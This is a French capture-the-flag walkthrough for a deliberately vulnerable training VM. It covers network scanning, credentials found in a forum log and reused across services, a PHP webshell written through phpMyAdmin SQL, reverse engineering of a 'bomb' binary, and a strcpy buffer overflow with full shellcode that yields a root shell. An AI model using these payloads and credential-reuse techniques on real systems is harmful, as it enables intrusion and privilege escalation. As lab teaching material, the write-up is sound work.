# Solution 1

## Prélude

Après avoir configuré la VM, il nous faut maintenant trouver un moyen de nous y connecter sachant que nous n'avons aucunes informations sur ses utilisateurs, leurs mots de passe. Nous n'avons même pas l'adresse de la VM.

Nous allons donc utiliser un outil appelé `nmap`, qui va venir scanner notre réseau pour trouver les `adresses IP` qui sont connectées ainsi que les `ports` qui sont ouverts sur ces adresses.

Afin de réduire le champs des adresses possibles, nous allons voir dans la configuration de `VirtualBox`. On y voit que notre adresse sera située entre `192.168.56.101` et `192.168.56.254`.

![VirtualBox Network Configuration](/images/vbox_network.png)

On lance donc `nmap` sur cette plage :

```shell
$ nmap 192.168.56.101-254
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-16 13:52 CET
Nmap scan report for 192.168.56.107
Host is up (0.00016s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 154 IP addresses (1 host up) scanned in 2.66 seconds
```

On sait maintenant que l'IP de notre VM est `192.168.56.107` et que plusieurs ports sont ouverts.

Lorsque l'on se rend à l'adresse de notre VM sur un navigateur, voilà ce que l'on obtient :

![Home website](/images/home.png)

## Social Engineering

Nous allons maintenant effectuer un scan avec `dirb` qui va nous permettre d'effectuer une attaque par dictionnaire dans le but de lister les répertoires existants sur le site. Voici les chemins trouvé :

![dirb output](/images/dirb_output.png)

On peut constater 3 pages principales :

- forum
- webmail
- phpmyadmin

L'accès aux pages `webmail` et `phpmyadmin` est verouillé par un mot de passe, nous allons donc chercher des indices sur le forum.

Un des utilisateurs , `lmezard`, semble avoir des problèmes de connection et à partagé un fichier de log d'erreur. Dans ce fichier, il y a un endroit où on se rend compte qu'il a tapé ce qui ressemble à un mot de passe dans un champ username.

```
...
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
...
```

On essaye donc de se connecter au forum avec les identifiants `lmezard:!q\]Ej?*5K5cy*AJ`, ça marche !

Ensuite on va dans son profil où l'on trouve son adresse mail `laurie@borntosec.net`, et comme cette personne n'a pas utilisé de mot de passe différent, on peut se connecter au client mail,

Client mail où l'un des mails a pour objet `DB Access` et contient le mot de passe `root` de `phpmyadmin` :

`root/Fg-'kKXBj87E:aJ$`

## Exploit phpmyadmin

[Linux Hacking Case Studies Part 3: phpMyAdmin](https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/)

Grâce à ce site, nous avons une potentielle porte d'entrée dans la VM via la création d'un `webshell` par le moyen d'une requête `SQL`.

La requête est la suivante :

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```

Le webshell sera donc théoriquement accessible à l'adresse `https://IP/phpMyAdmin/cmd.php`. Malheureusement nous n'avons pas les droits requis pour écrire à cette adresse.

Nous reprenons la sortie de `dirb` et tentons d'écrire dans tous les dossier jusqu'à en trouver un qui fonctionne : `forum/templates_c/cmd.php`.

La requête `SQL` est maintenant :

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
```

Et le webshell est accessible à l'adresse `https://IP/forum/templates_c/cmd.php'`.

![webshell](/images/webshell.png)

On peut voir que nous sommes connecté en tant que `www-data`, voyons maintenant à quels fichiers nous avons accès :

_Pour une meilleure lisibilité, pas de screenshot_

```shell
$ find / -user www-data -print 2>/dev/null
/home
/home/LOOKATME
/home/LOOKATME/password
/proc/1548
/proc/1548/task
/proc/1548/task/1548
...
```

```shell
$ cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

On trouve un fichier `/home/LOOKATME/password` contenant un couple d'identifiants, peut-être pour se connecter à la VM ?

## FTP Fun

Les identifiants précedemment récupéré ne fonctionnant pas en `ssh`, nous essayons de nous connecter via `ftp` avec le logiciel `Filezilla` car nmap nous avait indiqué que le `port 21` était ouvert et permettait une connection `ftp`.

Les identifiants fonctionnent et nous permettent de récupérer deux fichiers : `README` et `fun`.

```shell
$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

Et le fichier `fun` qui est compressé.

```shell
$ tar -xvf fun
ft_fun/
ft_fun/C4D03.pcap
ft_fun/GKGEP.pcap
...
ft_fun/G3VJZ.pcap
ft_fun/Y8S1M.pcap

$ cat ft_fun/C4D03.pcap
}void useless() {

//file259%

$ cat ft_fun/GKGEP.pcap
}void useless() {

//file711%
```

On créé donc un [script python](/script/fun.py) qui rassemble tout les fichiers en un seul, en prenant soin de les remettre dans l'ordre. Une fois cela fait on compile le fichiers c ainsi créé et on le lance :

```shell
$ python3 fun.py
$ gcc main.c
$ ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Il faut donc hasher `Iheartpwnage` avec `sha-256` ce qui donne `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

Un [script bash](/script/fun.sh) qui résume toutes ces étapes.

Nous pouvons maintenant nous connecter en ssh avec les identifiants `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` !

## Bomb

Après s'être connecté à l'utilisateur laurie, nous trouvons deux fichiers dans notre home : `README` et `bomb`.

```shell
$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

`bomb` est un exécutable qui comporte 6 niveaux, chacuns demandant un mot de passe pour accéder au suivant.

```shell
$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Hello World

BOOM!!!
The bomb has blown up.
```

Nous allons donc extraire l'exécutable via `scp` afin de pouvoir l'analyser sur notre machine.

```shell
$ scp laurie@192.168.56.107:/home/laurie/bomb .
```

En décompilant l'exécutable avec `Cutter` nous constatons que la bombe comporte effectivement 6 niveaux.

Niveau 1 :

_Voici le code `C` reconstitué :_

```C
void phase_1(char *pass)
{
    if (strcmp(pass, "Public speaking is very easy.")) {
        explode_bomb();
    }
    return;
}
```

Le mot de passe est donc `"Public speaking is very easy."`

```shell
$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?

```

Niveau 2 :

```C
void read_six_numbers(char *pass, int *tab)
{
    nb = sscanf(pass, "%d %d %d %d %d %d", tab[0], tab[1], tab[2], tab[3], tab[4], tab[5]);
    if (nb < 6) {
        explode_bomb();
    }
    return;
}

void phase_2(char *pass)
{
    int *tab;

    read_six_numbers(pass, tab);
    if (!tab) {
        explode_bomb();
    }

    for (i = 1; i <= 5; i++) {
        if (tab[i] != (i + 1) * tab[i - 1]) {
            explode_bomb();
        }
    }
}
```

La fonction `read_six_numbers` nous indique que notre input devra être une suite de six nombres, et grâce à notre indice, nous savons que le second est `2`.

La suite de la fonction `phase_2` nous indique comment doit évoluer notre suite : chaque nombre à partir du second de la suite doit être égal à sa position dans la suite multiplié par le nombre précédent.

Le mot de passe est donc : `1 2 6 24 120 720`.

```shell
...
1 2 6 24 120 720
That's number 2.  Keep going!

```

Niveau 3 :

```C
void phase_3(char *pass)
{
    uint32_t nb1;
    unsigned char ch1;
    uint32_t nb2;

    if (sscanf(pass, "%d %c %d", &nb1, &ch1, &nb2) < 3) {
        explode_bomb();
    }

    switch(nb1) {
        case 0:
            ch_cmp = 113;
            if (nb2 != 777) {
                explode_bomb();
            }
            break;
        case 1:
            ch_cmp = 98;
            if (nb2 != 214) {
                explode_bomb();
            }
            break;
        case 2:
            ch_cmp = 98;
            if (nb2 != 755) {
                explode_bomb();
            }
            break;
        case 3:
            ch_cmp = 107;
            if (nb2 != 251) {
                explode_bomb();
            }
            break;
        case 4:
            ch_cmp = 111;
            if (nb2 != 160) {
                explode_bomb();
            }
            break;
        case 5:
            ch_cmp = 116;
            if (nb2 != 458) {
                explode_bomb();
            }
            break;
        case 6:
            ch_cmp = 118;
            if (nb2 != 780) {
                explode_bomb();
            }
            break;
        case 7:
            ch_cmp = 98;
            if (nb2 != 524) {
                explode_bomb();
            }
            break;
        default:
            explode_bomb();
    }

    if (ch_cmp == ch1) {
        return;
    }
    explode_bomb();
}
```

On peut voir ici que le mot de passe doit être constitué de `3` éléments : 1 `int`, puis 1 `char` et 1 `int`.

Grâce à l'indice, nous savons que le caractère est un `b`, code ascii `98`<sub>`10`</sub>, nous avons donc 3 combinaisons possibles pour `nb1` et `nb2` :

- `1;214`
- `2;755`
- `7;524`

La première est la bonne !

Le mot de passe est donc `1 b 214`

_note: les 3 combinaisons fonctionnent, il faudra toutes les essayer pour voir la quelle est dans le mot de pass de Thor_

```
...
1 b 214
Halfway there!

```

Niveau 4 :

```C
int32_t func4(int arg)
{
    int var1;
    int var2;

    if (arg < 2) {
        var2 = 1;
    } else {
        var1 = func4(arg - 1);
        var2 = func4(arg - 2);
        var2 = var2 + var1;
    }
    return var2;
}

void phase_4(char *pass)
{
    int arg;

    if (sscanf(pass, "%d", &arg) == 1) {
        if (func4(arg) != 55) {
            explode_bomb();
        }
        return;
    }
    explode_bomb();
}
```

On voit que notre input est un nombre unique qui est envoyé dans une fonction récursive `func4`. La sortie de cette fonction est ensuite évaluée, si elle est égale à 55, c'est gagné.

Nous reproduisons donc `func4` pour pouvoir tester son comportement et trouvons que l'input qui renverra `55` est `9`.

Le mot de passe est donc `9`

```
...
9
So you got that one.  Try this one.

```

Niveau 5 :

```C
void phase_5(char *pass)
{
    char hash[7];
    char key[] = "isrveawhobpnutfg"

    if (strlen(pass) != 6) {
        explode_bomb();
    }
    for (i = 0; i <= 5; i++) {
        hash[i] = key[str[i] & 0xf];
    }
    hash[6] = '\0'
    if (strcmp(hash, "giants")) {
        explode_bomb();
    }
    return;
}
```

Pour cet exercice, le programme prends notre input, vérifie qu'il fait 6 charactères, le passe dans une boucle de cryptage et le compare ensuite à la string `"giants"`.

Nous reproduisons donc cette fonction de cryptage pour obtenir une correspondance avec l'alphabet :

```shell
$ python phase_5.py
abcdefghijklmnopqrstuvwxyz
srveawhobpnutfgisrveawhobp
```

Avec la correspondance, nous identifions donc 4 mots de passe possibles : `opekma`, `opekmq`, `opukma` et `opukmq`. Comme pour le niveau 3, ils fonctionnent tous, nous devrons donc tous les essayer pour le mot de passe de Thor.

```
...
opekma
Good work!  On to the next...

```

Niveau 6 :

```C
void read_six_numbers(char *pass, int *tab)
{
    nb = sscanf(pass, "%d %d %d %d %d %d", tab[0], tab[1], tab[2], tab[3], tab[4], tab[5]);
    if (nb < 6) {
        explode_bomb();
    }
    return;
}

void phase_6(char *pass)
{
    int *tab;

    int32_t *piVar1;
    code *pcVar2;
    int32_t iVar3;
    code *pcVar4;
    int32_t iVar5;
    int32_t var_58h;
    int32_t var_3ch;
    int32_t var_38h;
    int32_t var_34h;
    int32_t var_30h;
    code *apcStack48 [5];
    int32_t tab;
    int32_t aiStack24 [5];

    read_six_numbers(pass, tab);

    for (i = 0; i <= 5;  i++) {
        if (tab[i] > 6) {
            explode_bomb();
        }
        for (j = i + 1; j <= 6; j++) {
            if (tab[i] == tab[j]) {
                explode_bomb();
            }
        }
    }

    iVar5 = 0;
    do {
        pcVar4 = node1;
        iVar3 = 1;
        if (1 < aiStack24[iVar5 + -1]) {
            do {
                pcVar4 = *(code **)(pcVar4 + 8);
                iVar3 = iVar3 + 1;
            } while (iVar3 < aiStack24[iVar5 + -1]);
        }
        apcStack48[iVar5 + -1] = pcVar4;
        iVar5 = iVar5 + 1;
    } while (iVar5 < 6);

    iVar5 = 1;
    pcVar4 = (code *)var_30h;
    do {
        pcVar2 = apcStack48[iVar5 + -1];
        *(code **)(pcVar4 + 8) = pcVar2;
        iVar5 = iVar5 + 1;
        pcVar4 = pcVar2;
    } while (iVar5 < 6);

    *(undefined4 *)(pcVar2 + 8) = 0;
    iVar5 = 0;
    do {
        if (*(int32_t *)var_30h < **(int32_t **)(var_30h + 8)) {
            explode_bomb();
        }
        var_30h = *(int32_t *)(var_30h + 8);
        iVar5 = iVar5 + 1;
    } while (iVar5 < 5);

    return;
}
```

Le programme lit `6` nombres et est composé de plusieurs boucles. La première vérifie que chaque nombre est bien compris entre `1` et `6` et que tous sont différents.

L'indice donné est que le premier chiffre est `4`. Nous avons assez d'information pour bruteforce la bonne combinaison. (Il y a 120 combinaisons possibles).

Nous créons donc un script à exécuter sur la vm qui va lire toutes ces combinaisons stockées dans un fichier et les essayer. Lorsque le programme a trouvé la bonne solution, il s'arrête et la print.

```shell
$ python phase_6.py
4 2 6 3 1 5
```

Et lorsqu'on essaie la solution :

```shell
...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
$
```

Selon le `README`, le mot de passe pour `thor` est la combinaison de tous les pass de la bomb sans les espaces.

Après avoir essayé les différentes combinaisons possibles (voir exercices 3 et 5). Aucune solution ne fonctionne. Un petit tour sur `Slack` nous informe qu'une erreur est présente sur l'ISO et qu'il faut inverser les caractères `n-1` et `n-2`.

La bonne combinaison pour l'utilisateur suivant est donc : `thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## Turtle

Dans le home de `Thor`, encore une fois deux fichier : un `README` nous invitant à résoudre l'énigme pour trouver le mot de passe de `zaz`, et un fichier `turtle` contenant une longue liste d'instructions du style `Tourne droite de 90 degree` ou encore `Avance 100 spaces`.

Après quelques recherche, nous trouvons que le `turtle` est en fait un langage de programmation éducatif et que la suite d'instruction à pour but de faire déplacer une tortue qui va dessiner sur son chemin.

Nous trouvons donc un [interpréteur](http://www.logointerpreter.com/turtle-editor.php) de `turtle` en ligne, mais les instructions qu'il prend ne sont pas exactement les mêmes. Nous écrivons donc un script qui va venir modifier le fichier d'instructions pour le rendre conforme.

Après exécution , les lettre `S` `L` `A` `S` `H` ont été dessinées.

![turtle](/images/turtle.png)

Nous essayons donc `zaz:SLASH`, ce qui ne fonctionne pas. Grâce à [ce site](http://hash-functions.online-domain-tools.com/), nous trouvons qu'il faut passer `SLASH` dans un algorithme de cryptage MD5 pour obtenir le bon mot de passe.

La bonne combinaison pour l'utilisateur suivant est donc : `zaz:646da671ca01bb5d84dbb5fb2238dc8e`

## Zaz

En se connectant, on trouve cette fois un dossier `mail` contenant des fichiers vides et un exécutable `exploit_me` qui a la particularité d'appartenir à `root`... ça sent bon !

On extrait donc l'exécutable de la VM pour pouvoir l'analyser.

```C
int main(int argc, char **argv)
{
    char buffer[140];

    if (argc > 1) {
        strcpy(buffer, argv[1]);
        puts(buffer);
    }
    return argc < 2;
}
```

Nous avons là un simple `main` qui déclare un buffer, copie le premier argument du programme dedans et l'affiche ensuite.

Le problème est que pour copier la chaîne de caractères, le programme utilise la fonction `strcpy` qui est vulnérable aux attaques de type `buffer overflow` car elle ne vérifie pas le nombre de caractères qu'elle copie. Il nous suffit donc de passer en argument une chaine de caractères de 140 caractères ou plus pour que le programme segfault.

Cela nous indique que du caractère 141 au 144 nous pouvons passer l'adresse d'un code qui sera exécuté par le programme alors qu'il devait se terminer.

Nous allons passer l'adresse d'un `shellcode`, un bout de code malicieux qui va faire exécuter la commande `/bin/sh` par le programme, et donc nous ouvrir un shell `root`.

![buffer_overflow](/images/buffer_overflow.png)

Le format de commande est le suivant :

`./exploit me $(python -c 'print("nopslide" + "shellcode" + "adresse dans la nopslide")')`

L'adresse de la nopslide sera l'adresse du début du buffer qui est à `$esp + 0x10` donc `0xbffff640`

Notre commande finale est donc :

`./exploit_me $(python -c 'print("\x90"*95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbf\xff\xf6\x50"[::-1])')`

```shell
$ ./exploit_me $(python -c 'print("\x90"*95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbf\xff\xf6\x50"[::-1])')
^1��FF

      V
      ̀1ۉ@̀/bin/shP
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# whoami
root
#
```
